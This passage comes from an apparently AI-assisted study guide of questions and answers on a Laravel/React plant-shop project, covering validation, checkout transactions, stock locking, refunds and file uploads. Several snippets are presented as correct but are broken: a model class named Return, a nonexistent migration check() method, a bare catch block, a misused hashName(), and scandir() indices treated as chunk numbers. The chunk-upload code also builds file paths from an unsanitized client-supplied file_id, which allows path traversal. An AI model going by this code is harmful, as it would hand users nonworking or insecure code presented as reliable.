| **Simplicity** | ✅ Easiest | ❌ More files | ❌ Verbose | ❌ Complex |
| **Reusability** | ❌ No | ✅ Yes | ❌ No | ✅ Yes |
| **Authorization** | ❌ Manual | ✅ authorize() | ❌ Manual | ❌ No |
| **Custom Messages** | ❌ Inline | ✅ messages() | ❌ Inline | ✅ Yes |
| **Large Projects** | ❌ Messy | ✅ Best | ❌ Messy | ✅ For complex |

**Best Practices:**

- **Simple validation** (1-2 rules): Direct validate()
- **Complex validation** or reused: FormRequest
- **Specific rules** used many places: Custom Rule class

**Our project:** We use direct validate() which is fine for a student project. Production apps should use FormRequest.

---

### Q37: How do you validate relationships? (e.g., plant_id must exist in plants table)

**Answer:**

**exists Rule** - Validates foreign key:
```php
$request->validate([
    'plant_id' => 'required|exists:plants,id',
    // Checks: plant_id value must exist in plants table's id column
]);
```

**Example in our project:**
```php
// When adding plant to cart, must verify plant exists
$request->validate([
    'plant_id' => 'required|integer|exists:plants,id',
    'quantity' => 'required|integer|min:1',
]);

// If plant_id = 999 doesn't exist in plants table → Fails validation
// Error: "The selected plant id is invalid."
```

**Advanced: exists with additional conditions**
```php
$request->validate([
    'plant_id' => 'required|exists:plants,id,is_active,1',
    // plant_id must exist in plants table AND is_active = 1
]);

// Only allow inactive plants for admins
'plant_id' => [
    'required',
    Rule::exists('plants', 'id')
        ->where('is_active', $this->admin ? 0 : 1)
]
```

**When to use:**

**❌ Bad (No validation)**
```php
public function addToCart(Request $request) {
    CartItem::create([
        'user_id' => auth()->id(),
        'plant_id' => $request->plant_id,  // What if invalid ID?
        'quantity' => $request->quantity,
    ]);
    // Database constraint might fail!
    // Or creates orphaned cart items!
}
```

**✅ Good (With validation)**
```php
public function addToCart(Request $request) {
    $request->validate([
        'plant_id' => 'required|exists:plants,id',
        'quantity' => 'required|integer|min:1|max:100',
    ]);
    
    CartItem::create($request->validated());
    // Guaranteed valid plant_id
}
```

**All exists() validations in our project:**

```php
// Cart item must reference existing plant
'plant_id' => 'required|exists:plants,id'

// Order item must reference existing order
'order_id' => 'required|exists:orders,id'

// Review must reference existing plant
'plant_id' => 'required|exists:plants,id'

// Wishlist must reference existing plant
'plant_id' => 'required|exists:plants,id'
```

---

### Q38: What is difference between 'unique' and 'exists' validation rules?

**Answer:**

**exists** - Value MUST exist in database
```php
'plant_id' => 'exists:plants,id'
// plant_id must be found in plants table
```

**unique** - Value MUST NOT already exist in database
```php
'email' => 'unique:users,email'
// Email must not already be in users table
```

**Examples:**

```php
// User Registration
$request->validate([
    'email' => 'required|email|unique:users,email',
    // Email must not exist in users (prevent duplicates)
]);

// Add to Cart
$request->validate([
    'plant_id' => 'required|exists:plants,id',
    // plant_id must exist in plants (can't cart non-existent plant)
]);

// Create Blog
$request->validate([
    'slug' => 'required|string|unique:blogs,slug',
    // slug must be unique (each blog needs unique URL)
]);
```

**Update - Ignore Current Record:**
```php
// When updating, need to ignore current record
$request->validate([
    'email' => 'required|unique:users,email,' . $user->id,
    // Email must be unique EXCEPT for current user's email
]);

// Using Rule class (cleaner)
'email' => [
    'required',
    Rule::unique('users', 'email')->ignore($user->id),
]
```

**Comparison:**

| Rule | Meaning | Example | Use Case |
|------|---------|---------|----------|
| unique | Value must NOT exist | email must be unique | Login credentials, product codes |
| exists | Value MUST exist | plant_id must exist | Foreign keys, references |

**In SQL terms:**

```sql
-- unique
SELECT COUNT(*) FROM users WHERE email = 'john@email.com'
-- Must return 0 (doesn't exist)

-- exists  
SELECT COUNT(*) FROM plants WHERE id = 5
-- Must return >= 1 (exists)
```

---

### Q39: How do you handle validation errors and return them to frontend?

**Answer:**

**Automatic (Laravel default):**
```php
public function store(Request $request) {
    $request->validate([
        'name' => 'required|string',
        'price' => 'required|numeric',
    ]);
    // If validation fails, Laravel automatically:
    // 1. Returns 422 status code
    // 2. Returns JSON with errors
}

// Frontend receives:
// Status: 422
// Body:
{
    "message": "The given data was invalid.",
    "errors": {
        "name": ["The name field is required."],
        "price": ["The price field is required."]
    }
}
```

**Frontend handling:**
```js
try {
    const response = await fetch('/api/plants', {
        method: 'POST',
        body: JSON.stringify(data)
    });
    
    if (response.status === 422) {
        const {errors} = await response.json();
        // errors = {name: [...], price: [...]}
        
        // Show errors to user
        setFormErrors(errors);
        return;
    }
    
    const {plant} = await response.json();
    // Success
} catch (error) {
    setError('Network error');
}
```

**Custom Error Messages:**
```php
// FormRequest
class StorePlantRequest extends FormRequest {
    public function messages() {
        return [
            'name.required' => 'Please enter a plant name',
            'price.numeric' => 'Price must be a number',
            'price.min' => 'Price cannot be negative',
        ];
    }
}

// Or inline
$request->validate(
    ['name' => 'required'],
    ['name.required' => 'Plant name is required']
);

// Frontend receives custom messages
{
    "errors": {
        "name": ["Plant name is required"]
    }
}
```

**Catch & Return Custom Errors:**
```php
public function store(Request $request) {
    try {
        $validated = $request->validate([...]);
        $plant = Plant::create($validated);
        return response()->json(['plant' => $plant], 201);
    
    } catch (\Illuminate\Validation\ValidationException $e) {
        // Validation failed
        return response()->json([
            'success' => false,
            'errors' => $e->errors(),
            'message' => 'Please fix the errors below'
        ], 422);
    } catch (\Exception $e) {
        // Other errors
        return response()->json([
            'success' => false,
            'message' => 'Server error occurred'
        ], 500);
    }
}
```

**Frontend React Component:**
```tsx
export function CreatePlant() {
    const [formData, setFormData] = useState({name: '', price: ''});
    const [errors, setErrors] = useState<Record<string, string[]>>({});
    const [loading, setLoading] = useState(false);
    
    const handleSubmit = async (e: React.FormEvent) => {
        e.preventDefault();
        setLoading(true);
        
        const response = await fetch('/api/plants', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(formData)
        });
        
        if (response.status === 422) {
            const {errors: newErrors} = await response.json();
            setErrors(newErrors);  // Show errors
            setLoading(false);
            return;
        }
        
        // Success
        setErrors({});
        setLoading(false);
        // Redirect
    };
    
    return (
        <form onSubmit={handleSubmit}>
            <input
                name="name"
                value={formData.name}
                onChange={(e) => setFormData({...formData, name: e.target.value})}
            />
            {errors.name && <p className="error">{errors.name[0]}</p>}
            
            <input
                name="price"
                type="number"
                value={formData.price}
                onChange={(e) => setFormData({...formData, price: e.target.value})}
            />
            {errors.price && <p className="error">{errors.price[0]}</p>}
            
            <button type="submit" disabled={loading}>{loading ? 'Save...' : 'Save Plant'}</button>
        </form>
    );
}
```

---

### Q40: What's the difference between validation, authorization, and authentication?

**Answer:**

These three are often confused but completely different:

**Authentication** - "Who are you?"
- Verifying user identity
- Check token/credentials
- Is this person real?

**Authorization** - "What can you do?"
- Check permissions/roles
- Can this person access this resource?
- Is user an admin?

**Validation** - "Is data correct?"
- Check data format/values
- Does input meet requirements?
- Is email valid? Is price > 0?

**Example Scenario: User tries to post a negative review**

1. **Authentication**: Is the user logged in?
   - Check token in header
   - If no token → 401 Unauthorized

2. **Authorization**: Does the user have permission to review?
   - Check if user has purchased this plant
   - Check if user hasn't already reviewed
   - If not allowed → 403 Forbidden

3. **Validation**: Is the review data valid?
   - Rating between 1-5?
   - Comment is not empty?
   - Comment is reasonable length?
   - If fails → 422 Unprocessable Entity

**In Code Order:**

```php
Route::middleware('auth:sanctum')->post('/plants/{id}/review', function (Request $request, $id) {
    // Step 1: AUTHENTICATION (middleware handles)
    // If not authenticated → 401 (never reach here)
    
    // Step 2: AUTHORIZATION
    $user = auth()->user();
    $plant = Plant::findOrFail($id);
    
    // Check if user purchased this plant
    $hasPurchased = Order::where('user_id', $user->id)
        ->whereHas('items', fn($q) => $q->where('plant_id', $id))
        ->exists();
    
    if (!$hasPurchased) {
        return response()->json(['error' => 'Must purchase plant to review'], 403);
    }
    
    // Check if already reviewed
    $alreadyReviewed = Review::where('user_id', $user->id)
        ->where('plant_id', $id)
        ->exists();
    
    if ($alreadyReviewed) {
        return response()->json(['error' => 'Already reviewed'], 403);
    }
    
    // Step 3: VALIDATION
    $validated = $request->validate([
        'rating' => 'required|integer|min:1|max:5',
        'comment' => 'required|string|min:10|max:500',
    ]);
    
    // All checks passed ✓
    Review::create([
        'user_id' => $user->id,
        'plant_id' => $id,
        ...$validated,
    ]);
    
    return response()->json(['created' => true]);
});
```

**Status Code by Type:**

| Type | Exception | Status | Reason |
|------|-----------|--------|--------|
| **Authentication** | Not logged in | 401 | Who are you? |
| **Authorization** | Logged in but no permission | 403 | You can't do this |
| **Validation** | Invalid data | 422 | Bad format/value |

**Flowchart:**

```
Request arrives
  ↓
Authentication ✓ (Valid token)
  ↓
Authorization ✓ (User is admin)
  ↓
Validation ✓ (Data is correct)
  ↓
Process request ✓
  ↓
Return response 200

---

If any fails:
- Auth fails → 401
- Authorization fails → 403
- Validation fails → 422
```

---

## I) Business Logic (Cart, Order, Checkout)

### Q41: How does the cart system work in your project? From adding to checkout.

**Answer:**

**Cart Workflow:**

```
User adds plant to cart
  ↓
POST /api/cart
  {plant_id: 5, quantity: 2}
  ↓
CartController::store()
  ✓ Validate plant exists
  ✓ Get or create user's cart
  ✓ Add item to cart
  ✓ Return updated cart
  ↓
Frontend updates cart count
  ↓
User views cart
  GET /api/cart
  ↓
CartController::index()
  ✓ Fetch user's cart items
  ✓ Load plant details for each item
  ✓ Return with total price
  ↓
Frontend displays items with total
  ↓
User clicks Checkout
  ↓
POST /api/checkout or /api/orders
  {delivery_address, ...}
  ↓
OrderController::store()
  ✓ Validate checkout data
  ✓ Create order record
  ✓ Copy cart items to order_items
  ✓ Update plant stock
  ✓ Clear user's cart
  ✓ Return order details
  ↓
Frontend redirects to order confirmation
```

**Database Tables:**

```sql
-- Cart (Temporary - for current shopping)
carts:
  id | user_id | created_at | updated_at

cart_items:
  id | cart_id | plant_id | quantity | created_at | updated_at

-- Order (Permanent - history)
orders:
  id | user_id | status | total | delivery_address | created_at

order_items:
  id | order_id | plant_id | quantity | price | created_at

-- Products
plants:
  id | name | price | stock
```

**Key Code in Our Project:**

**Add to Cart:**
```php
// CartController::store()
public function store(Request $request) {
    $request->validate([
        'plant_id' => 'required|exists:plants,id',
        'quantity' => 'required|integer|min:1',
    ]);
    
    $user = auth()->user();
    $plant = Plant::findOrFail($request->plant_id);
    
    // Get or create user's cart
    $cart = Cart::firstOrCreate(['user_id' => $user->id]);
    
    // Check if plant already in cart
    $item = CartItem::where('cart_id', $cart->id)
        ->where('plant_id', $request->plant_id)
        ->first();
    
    if ($item) {
        // Already in cart - increase quantity
        $item->increment('quantity', $request->quantity);
    } else {
        // New item
        CartItem::create([
            'cart_id' => $cart->id,
            'plant_id' => $request->plant_id,
            'quantity' => $request->quantity,
        ]);
    }
    
    return response()->json(['cart' => $cart->load('items.plant')]);
}
```

**View Cart:**
```php
// CartController::index()
public function index() {
    $user = auth()->user();
    $cart = Cart::where('user_id', $user->id)
        ->with('items.plant')
        ->first();
    
    if (!$cart) {
        return response()->json(['items' => [], 'total' => 0]);
    }
    
    $total = $cart->items->sum(fn($item) => 
        $item->quantity * $item->plant->price
    );
    
    return response()->json([
        'items' => $cart->items,
        'total' => $total,
    ]);
}
```

**Checkout:**
```php
// OrderController::store()
public function store(Request $request) {
    $request->validate([
        'delivery_address' => 'required|string',
        'phone' => 'required|phone',
    ]);
    
    $user = auth()->user();
    $cart = Cart::where('user_id', $user->id)->first();
    
    if (!$cart || $cart->items->isEmpty()) {
        return response()->json(['error' => 'Cart is empty'], 400);
    }
    
    // Calculate total
    $total = $cart->items->sum(fn($item) => 
        $item->quantity * $item->plant->price
    );
    
    // Create order
    $order = Order::create([
        'user_id' => $user->id,
        'status' => 'pending',
        'total' => $total,
        'delivery_address' => $request->delivery_address,
        'phone' => $request->phone,
    ]);
    
    // Copy cart items to order
    foreach ($cart->items as $cartItem) {
        OrderItem::create([
            'order_id' => $order->id,
            'plant_id' => $cartItem->plant_id,
            'quantity' => $cartItem->quantity,
            'price' => $cartItem->plant->price, // Snapshot price
        ]);
        
        // Update stock
        $cartItem->plant->decrement('stock', $cartItem->quantity);
    }
    
    // Clear cart
    CartItem::where('cart_id', $cart->id)->delete();
    Cart::where('user_id', $user->id)->delete();
    
    return response()->json(['order' => $order], 201);
}
```

---

### Q42: Why do we store price in order_items instead of always using plants.price?

**Answer:**

**Problem (Using plants.price):**
```php
// Order placed on 2026-02-26
// Monstera costs $15

$order = Order::find(1);
foreach ($order->items as $item) {
    $total += $item->plant->price * $item->quantity;
    // Uses $15
}
// Total = $30

// Later, price changes
$monstera->update(['price' => $20]);

// Customer views old order
$order = Order::find(1);
foreach ($order->items as $item) {
    $total += $item->plant->price * $item->quantity;
    // Now uses $20!
}
// Total = $40

// PROBLEM: Order total changed!
// Customer was charged $30 but order shows $40
```

**Solution (Store in order_items):**
```php
// order_items table
| id | order_id | plant_id | quantity | price |
| 1  | 1        | 5        | 2        | 15    | ← Snapshot at purchase time

// Later, price changes
$monstera->update(['price' => $20]);

// Customer views old order
$order = Order::find(1);
foreach ($order->items as $item) {
    $total += $item->price * $item->quantity;  // Uses order_items.price
    // Uses $15 (original price)
}
// Total = $30 ✓ Correct!
```

**In Code:**
```php
// When creating order
foreach ($cart->items as $cartItem) {
    OrderItem::create([
        'order_id' => $order->id,
        'plant_id' => $cartItem->plant_id,
        'quantity' => $cartItem->quantity,
        'price' => $cartItem->plant->price,  // SNAPSHOT current price
    ]);
}

// Later calculations
$total = $order->items->sum(fn($item) => 
    $item->price * $item->quantity  // Uses stored price, not current
);
```

**Key Principle:**
Historical data should be immutable. Once an order is placed:
- Customer's price shouldn't change
- Product details shouldn't change
- Order should reflect exactly what was agreed at purchase time

**Other Examples:**
```sql
-- User's address at order time
order_items stores: delivery_address
-- Not: customers.current_address

-- Discount applied at order time
order_items stores: discount_amount
-- Not: current discounts active in system
```

---

### Q43: How do you prevent overselling (selling more than stock)?

**Answer:**

**Problem (Without Stock Check):**
```
Plant: Monstera (stock = 1)

User A: Add 1 to cart → OK (stock = 1)
User B: Add 1 to cart → OK (stock = 1)
User A: Checkout → Creates order, stock becomes 0 ✓
User B: Checkout → Creates order, BUT stock goes negative ✗
```

**Solution 1: Check Before Checkout**
```php
public function checkout(Request $request) {
    $user = auth()->user();
    $cart = Cart::where('user_id', $user->id)
        ->with('items.plant')
        ->first();
    
    // Check stock for each item
    foreach ($cart->items as $item) {
        if ($item->quantity > $item->plant->stock) {
            return response()->json([
                'error' => $item->plant->name . ' only has ' . $item->plant->stock . ' left'
            ], 400);
        }
    }
    
    // All items have sufficient stock - proceed
    // ... create order ...
}
```

**Solution 2: Database Lock (Production)**
```php
use Illuminate\Support\Facades\DB;

public function checkout(Request $request) {
    $user = auth()->user();
    
    // Lock plant rows to prevent race condition
    DB::transaction(function() use ($user) {
        $cart = Cart::where('user_id', $user->id)
            ->with('items')
            ->first();
        
        // Get plants with LOCK
        $plants = Plant::whereIn('id', 
            $cart->items->pluck('plant_id')
        )->lockForUpdate()->get();  // Lock these rows!
        
        // Check stock again (now that locked)
        foreach ($cart->items as $item) {
            $plant = $plants->find($item->plant_id);
            if ($item->quantity > $plant->stock) {
                throw new Exception('Out of stock');
            }
        }
        
        // Update stock (no other process can interfere)
        foreach ($cart->items as $item) {
            Plant::where('id', $item->plant_id)
                ->increment('stock', -$item->quantity);
        }
        
        // Create order
        Order::create([...]);
    });
}
```

**Solution 3: Database Constraint (Ultimate Safety)**
```sql
-- In migration
Schema::table('plants', function (Blueprint $table) {
    // Add check constraint
    $table->check('stock >= 0');
    // Database will prevent stock from going negative!
});

// If code has bug and tries to set stock to -5:
// Database throws error - prevents corruption
```

**Our Project Implementation:**
We likely use Solution 1 (frontend + backend check). For production, use Solution 2 (transactions + locks).

---

### Q44: What happens if server crashes during checkout? (Data consistency)

**Answer:**

**Problem Scenario:**
```
User clicks checkout
  ↓
POST /api/checkout
  ↓
OrderController:
  ✓ Create order record
  ✓ Create order items
  ✓ Update stock
  ✗ SERVER CRASHES before clearing cart!
  ↓
Result:
- Order created ✓
- Stock updated ✓
- Cart NOT cleared ✗
- User data inconsistent!
```

**Solution: Database Transactions**

```php
use Illuminate\Support\Facades\DB;

public function checkout(Request $request) {
    // Wrap all operations in transaction
    $order = DB::transaction(function() use ($request) {
        $user = auth()->user();
        $cart = Cart::where('user_id', $user->id)->first();
        
        // Create order
        $order = Order::create([...]);
        
        // Copy items
        foreach ($cart->items as $item) {
            OrderItem::create([...]);
        }
        
        // Update stock
        foreach ($cart->items as $item) {
            $item->plant->decrement('stock', $item->quantity);
        }
        
        // Clear cart (PART OF TRANSACTION now)
        CartItem::where('cart_id', $cart->id)->delete();
        $cart->delete();
        
        return $order;
        // If we reach here: COMMIT (all changes permanent)
        // If exception thrown: ROLLBACK (all changes undone)
    });
    
    return response()->json(['order' => $order], 201);
}
```

**How Transactions Work:**

```
DB::transaction(function() {
    // Step 1
    Query 1 (Create order)
    // Step 2
    Query 2 (Create items)
    // Step 3
    Query 4 (Update stock)
    // Step 5
    Query 5 (Clear cart)
    // All successful?
}) 
  ↓
  ✓ All committed to database (all or nothing)
  ↓
  ✗ Exception during step 3?
    Rollback - undo all changes
```

**Database Level:**
```sql
START TRANSACTION;
  INSERT INTO orders ...
  INSERT INTO order_items ...
  UPDATE plants SET stock = stock - 2 ...
  DELETE FROM cart_items ...
COMMIT;  -- All or nothing!

-- If error:
ROLLBACK;  -- Undo everything
```

**Exception Example:**
```php
DB::transaction(function() {
    Order::create(['user_id' => 1, 'total' => 5000]);
    
    // What if this stock update fails?
    $plant = Plant::find(999);  // Doesn't exist!
    $plant->decrement('stock');  // Exception!
    
    // Exception thrown - entire transaction rolled back
    // Order was created, BUT...
    // When transaction rolls back, order creation is undone too
});
```

**Savepoints (Nested Transactions):**
```php
DB::transaction(function() {
    Order::create([...]);
    
    // Nested transaction
    try {
        DB::transaction(function() {
            PlantLog::create([...]);  // Optional
        });
    } catch {
        // Log failed, but order still created
    }
    
    // Continue
});
```

**Best Practice for Checkout:**
```php
public function checkout(Request $request) {
    return DB::transaction(function() use ($request) {
        $user = auth()->user();
        $cart = Cart::where('user_id', $user->id)
            ->lockForUpdate()  // Lock to prevent race
            ->first();
        
        // ... all checkout logic ...
        
        CartItem::where('cart_id', $cart->id)->delete();
        $cart->delete();
        
        return $order;
        // COMMIT only if reached here
    });
}
```

---

### Q45: How do you handle returns/refunds? (If your project has it)

**Answer:**

**Our Project:** Doesn't have refund system currently, but here's how it should work:

**Database Schema:**
```sql
orders:
  id | user_id | status | total

order_items:
  id | order_id | plant_id | quantity | price | returned_quantity (default 0)

returns:
  id | order_id | reason | approved_date | refund_amount
```

**Return Request:**
```php
// ReturnController::store()
public function store(Request $request) {
    $request->validate([
        'order_id' => 'required|exists:orders,id',
        'item_id' => 'required|exists:order_items,id',
        'quantity' => 'required|integer|min:1',
        'reason' => 'required|string',
    ]);
    
    $orderItem = OrderItem::findOrFail($request->item_id);
    
    // Check if return already processed
    if ($orderItem->returned_quantity >= $orderItem->quantity) {
        return response()->json(['error' => 'Already returned'], 400);
    }
    
    // Create return request (pending admin approval)
    Return::create([
        'order_id' => $request->order_id,
        'item_id' => $request->item_id,
        'quantity' => $request->quantity,
        'reason' => $request->reason,
        'status' => 'pending',
    ]);
    
    return response()->json(['message' => 'Return request created'], 201);
}
```

**Admin Approves Return:**
```php
// ReturnController::approve()
public function approve($returnId) {
    $return = Return::findOrFail($returnId);
    
    DB::transaction(function() use ($return) {
        // Mark as approved
        $return->update([
            'status' => 'approved',
            'approved_date' => now(),
        ]);
        
        // Update item returned quantity
        $return->orderItem->increment('returned_quantity', $return->quantity);
        
        // Restore stock
        $return->orderItem->plant->increment('stock', $return->quantity);
        
        // Process refund
        $refund = Refund::create([
            'order_id' => $return->order_id,
            'amount' => $return->quantity * $return->orderItem->price,
            'status' => 'processed',
        ]);
        
        // Notify user
        User::find($return->order->user_id)->notify(new RefundProcessedNotification($refund));
    });
    
    return response()->json(['refund' => $return]);
}
```

---

## J) File Uploads

### Q46: How does file upload work? Where are files saved?

**Answer:**

**Upload Flow:**

```
1. User selects file
   ↓
2. Frontend sends multipart/form-data
   POST /api/upload
   File: [binary data]
   ↓
3. Backend receives file
   ↓
4. Validate file (type, size)
   ↓
5. Store file to disk/storage
   ↓
6. Save file path to database
   ↓
7. Return file URL to frontend
   ↓
8. Frontend displays image
```

**Code Example (Our Project - UploadController):**

```php
public function store(Request $request) {
    $request->validate([
        'image' => 'required|image|mimes:jpeg,png,jpg,gif|max:2048',
    ]);
    
    // Store file
    $path = $request->file('image')->store('plants', 'public');
    // Stores in: storage/app/public/plants/
    // Returns path: plants/image_name.jpg
    
    // Make URL accessible
    $url = url('storage/' . $path);
    // URL: http://localhost:8000/storage/plants/image_name.jpg
    
    return response()->json(['path' => $path, 'url' => $url]);
}
```

**File Storage Directories:**

```
Laravel Project
├── storage/
│   ├── app/
│   │   └── public/  ← Public files (accessible via URL)
│   │       ├── plants/
│   │       ├── uploads/
│   │       └── ...
│   ├── logs/
│   └── framework/
├── public/
│   └── storage → symlink to storage/app/public/
└── ...
```

**Make Storage Accessible:**
```bash
# Run this once to create symlink
php artisan storage:link

# Creates: public/storage → storage/app/public/
```

**Store Methods:**

```php
// Method 1: Store in specific directory
$file->store('plants', 'public');
// Path: plants/filename.jpg
// URL: /storage/plants/filename.jpg

// Method 2: Store with custom name
$file->storeAs('plants', 'monstera.jpg', 'public');
// Path: plants/monstera.jpg
// URL: /storage/plants/monstera.jpg

// Method 3: Store with hash name
$path = $file->hashName('plants');
// Path: plants/abc123def456.jpg
// Prevents name conflicts
```

**In Our Project (Plant Images):**

```php
// PlantController::store()
public function store(Request $request) {
    $request->validate([
        'name' => 'required|string',
        'price' => 'required|numeric',
        'image' => 'nullable|image|max:2048',
    ]);
    
    $data = $request->validated();
    
    // Upload image if provided
    if ($request->hasFile('image')) {
        $path = $request->file('image')->store('plants', 'public');
        $data['image'] = $path;
    }
    
    Plant::create($data);
    
    return response()->json(['message' => 'Plant created']);
}
```

**Frontend Upload:**

```js
const handleImageUpload = async (file: File) => {
    const formData = new FormData();
    formData.append('image', file);
    formData.append('name', 'Monstera');
    formData.append('price', '1500');
    
    const response = await fetch('/api/upload', {
        method: 'POST',
        body: formData,
        // DON'T set Content-Type header!
        // Browser will set it with boundary
    });
    
    const {path, url} = await response.json();
    // url: http://localhost:8000/storage/plants/abc123.jpg
    
    // Display image
    <img src={url} alt="Plant" />
};
```

**File Validation:**
```php
$request->validate([
    'image' => 'required|image|mimes:jpeg,png,jpg|max:2048',
    // required - must have file
    // image - must be image type
    // mimes - only these formats
    // max:2048 - max 2MB
]);
```

---

### Q47: How do you delete files when user deletes a record?

**Answer:**

**Problem (Without Deletion):**
```php
// Delete plant from database
Plant::find(1)->delete();

// File still exists on server!
// storage/app/public/plants/image123.jpg
// Wasted storage space
```

**Solution: Delete File on Model Delete**

```php
// app/Models/Plant.php
class Plant extends Model {
    use SoftDeletes;
    
    protected static function booted() {
        // When plant is deleted
        static::deleted(function ($plant) {
            // Delete file from storage
            if ($plant->image && Storage::disk('public')->exists($plant->image)) {
                Storage::disk('public')->delete($plant->image);
            }
        });
    }
}

// Usage
$plant = Plant::find(1);
$plant->delete();  // File automatically deleted!
```

**Using Filesystem Facade:**

```php
use Illuminate\Support\Facades\Storage;

// Delete file
if (Storage::disk('public')->exists('plants/image.jpg')) {
    Storage::disk('public')->delete('plants/image.jpg');
}

// Delete directory
Storage::disk('public')->deleteDirectory('plants');
```

**Controller Implementation:**

```php
public function destroy($id) {
    $plant = Plant::findOrFail($id);
    
    // Delete file manually (if not using model events)
    if ($plant->image) {
        Storage::disk('public')->delete($plant->image);
    }
    
    // Delete database record
    $plant->delete();
    
    return response()->json(['message' => 'Plant deleted']);
}
```

**Cleanup Old Files:**

```php
// Delete files older than 30 days
$files = Storage::disk('public')->files('plants');
foreach ($files as $file) {
    $lastModified = Storage::disk('public')->lastModified($file);
    if (now()->diffInDays($lastModified) > 30) {
        Storage::disk('public')->delete($file);
    }
}
```

---

### Q48: What is multipart/form-data? Why use it for file uploads?

**Answer:**

**Normal Form Submission (application/x-www-form-urlencoded):**
```
POST /api/data
Content-Type: application/x-www-form-urlencoded

name=Monstera&price=1500&category=Plant
```

**Problem:** Can't send binary files with URL encoding!

**Multipart/Form-Data (For files):**
```
POST /api/upload
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="image"; filename="plant.jpg"
Content-Type: image/jpeg

[BINARY IMAGE DATA HERE - millions of bytes]
------WebKitFormBoundary
Content-Disposition: form-data; name="name"

Monstera
------WebKitFormBoundary--
```

**Why multipart?**

1. **Binary Safe**: Can send any file type
2. **Mixed Content**: Can send files + text in one request
3. **Streaming**: Large files don't load entirely in memory

**Frontend (Automatic):**
```js
const formData = new FormData();
formData.append('image', fileInput.files[0]);  // File
formData.append('name', 'Monstera');  // Text

fetch('/api/upload', {
    method: 'POST',
    body: formData,
    // Browser automatically sets Content-Type and boundary!
});
```

**Backend (Laravel handles it):**
```php
$request->file('image');  // Automatically parses multipart
$request->input('name');   // Gets text fields
```

**Don't Manually Set Header:**
```js
// WRONG - Don't do this!
fetch('/api/upload', {
    method: 'POST',
    headers: {
        'Content-Type': 'multipart/form-data'  // WRONG!
    },
    body: formData
});
// Browser can't set boundary!

// RIGHT - Let browser set it!
fetch('/api/upload', {
    method: 'POST',
    body: formData
    // Browser sets Content-Type automatically
});
```

---

### Q49: How do you handle large file uploads? (Progress, chunking)

**Answer:**

**Problem:** User uploads 100MB file
- Browser freezes
- No progress indication
- Network timeout possible

**Solution 1: Progress Indicator (Simple)**

```js
const handleUpload = (file: File) => {
    const formData = new FormData();
    formData.append('image', file);
    
    const xhr = new XMLHttpRequest();
    
    // Track progress
    xhr.upload.addEventListener('progress', (e) => {
        if (e.lengthComputable) {
            const percent = (e.loaded / e.total) * 100;
            setProgress(percent);
            console.log(`${percent}% uploaded`);
        }
    });
    
    xhr.addEventListener('load', () => {
        const response = JSON.parse(xhr.responseText);
        console.log('Upload complete!', response);
    });
    
    xhr.addEventListener('error', () => {
        console.error('Upload failed!');
    });
    
    xhr.open('POST', '/api/upload');
    xhr.send(formData);
};

// React Component
export function FileUpload() {
    const [progress, setProgress] = useState(0);
    
    return (
        <>
            <input type="file" onChange={(e) => 
                handleUpload(e.target.files![0])
            } />
            {progress > 0 && <progress value={progress} max="100" />}
            <p>{progress.toFixed(0)}%</p>
        </>
    );
}
```

**Solution 2: Chunk Upload (Large Files)**

```php
// Backend: Merge chunks
public function uploadChunk(Request $request) {
    $request->validate([
        'file' => 'required',
        'chunk_index' => 'required|integer',
        'total_chunks' => 'required|integer',
        'file_id' => 'required|string',
    ]);
    
    $fileId = $request->file_id;
    $chunkDir = storage_path("uploads/chunks/{$fileId}");
    
    // Create directory if not exists
    if (!is_dir($chunkDir)) {
        mkdir($chunkDir, 0755, true);
    }
    
    // Save this chunk
    $request->file('file')->move($chunkDir, $request->chunk_index);
    
    // Check if all chunks received
    if ($request->chunk_index == $request->total_chunks - 1) {
        // Merge chunks
        $output = fopen(storage_path("uploads/{$fileId}.jpg"), 'w');
        for ($i = 0; $i < $request->total_chunks; $i++) {
            $chunk = fopen("{$chunkDir}/{$i}", 'r');
            stream_copy_to_stream($chunk, $output);
            fclose($chunk);
            unlink("{$chunkDir}/{$i}");
        }
        fclose($output);
        rmdir($chunkDir);
        
        return response()->json(['url' => "/storage/uploads/{$fileId}.jpg"]);
    }
    
    return response()->json(['chunk' => $request->chunk_index]);
}
```

```js
// Frontend: Send chunks
async function uploadLargeFile(file: File) {
    const CHUNK_SIZE = 1024 * 1024;  // 1MB chunks
    const totalChunks = Math.ceil(file.size / CHUNK_SIZE);
    const fileId = generateUUID();
    
    for (let i = 0; i < totalChunks; i++) {
        const start = i * CHUNK_SIZE;
        const end = Math.min(start + CHUNK_SIZE, file.size);
        const chunk = file.slice(start, end);
        
        const formData = new FormData();
        formData.append('file', chunk);
        formData.append('chunk_index', i.toString());
        formData.append('total_chunks', totalChunks.toString());
        formData.append('file_id', fileId);
        
        const response = await fetch('/api/upload-chunk', {
            method: 'POST',
            body: formData
        });
        
        const progress = ((i + 1) / totalChunks) * 100;
        console.log(`Upload ${progress.toFixed(0)}%`);
    }
}
```

**Solution 3: Resume Upload (If connection drops)**

```php
// Check which chunks already received
public function getUploadProgress(Request $request) {
    $fileId = $request->file_id;
    $chunkDir = storage_path("uploads/chunks/{$fileId}");
    
    if (!is_dir($chunkDir)) {
        return response()->json(['chunks_received' => []]);
    }
    
    $chunks = array_keys(scandir($chunkDir));
    return response()->json(['chunks_received' => $chunks]);
}

// Frontend: Resume from last chunk
const progress = await fetch('/api/upload-progress?file_id=' + fileId).then(r => r.json());
startFrom = Math.max(...progress.chunks_received) + 1;  // Resume from here
```

---

### Q50: How do you prevent file upload security vulnerabilities?

**Answer:**

**Vulnerabilities:**

1. **Arbitrary File Upload** - Upload .php, .exe
2. **Directory Traversal** - Upload to ../../../admin/
3. **Denial of Service** - Upload huge files
4. **Malware** - Upload infected file

**Protections in Our Project:**

```php
$request->validate([
    'image' => 'required|image|mimes:jpeg,png,jpg,gif|max:2048',
    //         ↓
    //    Only allow image types (verified by mime type checking)
    //    Prevents uploading .php
    //    Only jpeg, png, jpg, gif allowed
    //    Max 2MB
]);
```

**What each validation does:**

| Validation | Protects Against | How |
|-----------|------------------|-----|
| image | Non-image files | Checks actual file content, not extension |
| mimes | Wrong image format | Whitelist allowed MIME types |
| max:2048 | Large files | Prevents DoS via large uploads |

**Advanced Protections:**

```php
public function store(Request $request) {
    $request->validate([
        'image' => [
            'required',
            'image',
            'mimes:jpeg,png,jpg',
            'max:2048',
            'dimensions:min_width=100,min_height=100,max_width=4000,max_height=4000',
            // Prevents ultra-small/large images (thumbnails vs huge files)
            new NoVirusesRule(),  // Custom rule to scan
        ]
